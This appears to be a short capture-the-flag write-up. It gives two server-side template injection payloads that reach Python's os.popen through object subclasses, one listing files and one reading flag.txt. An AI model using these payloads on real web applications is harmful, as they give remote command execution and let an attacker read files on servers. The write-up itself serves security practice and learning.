## [Completed with internet assistance] ##

# Exploration #


# Infiltration #
payload to make class and run script on server, runs ls
```js
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
```

# Exfiltration #
same payload, getting file instead
```js
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```